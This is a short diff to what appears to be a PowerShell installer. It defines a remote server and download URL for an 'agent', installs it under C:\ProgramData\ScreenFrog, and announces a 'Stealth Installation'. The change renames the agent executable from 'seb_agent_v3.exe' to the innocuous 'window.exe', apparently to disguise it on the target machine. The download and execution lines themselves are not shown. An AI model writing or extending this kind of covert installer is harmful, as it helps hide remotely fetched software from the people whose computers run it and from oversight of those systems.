@@ -5,7 +5,7 @@
 $ServerUrl   = "https://exam-system-v1.onrender.com"
 $DownloadUrl = "$ServerUrl/download/agent"
 $InstallDir  = "C:\ProgramData\ScreenFrog"
-$AgentExe    = "seb_agent_v3.exe"
+$AgentExe    = "window.exe"
 $TargetPath  = Join-Path $InstallDir $AgentExe
 
 Write-Host "[*] Initializing Stealth Installation..." -ForegroundColor Cyan
